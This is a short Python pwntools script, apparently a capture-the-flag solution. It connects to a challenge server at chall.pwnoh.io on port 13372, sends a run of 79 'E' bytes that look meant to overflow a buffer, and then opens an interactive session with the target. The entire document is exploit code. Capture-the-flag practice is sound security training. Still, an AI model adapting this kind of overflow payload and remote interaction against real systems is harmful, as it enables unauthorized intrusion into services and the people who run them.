from pwn import *

p = remote("chall.pwnoh.io", 13372)

p.sendline(b"E" * 0x4f)

p.interactive()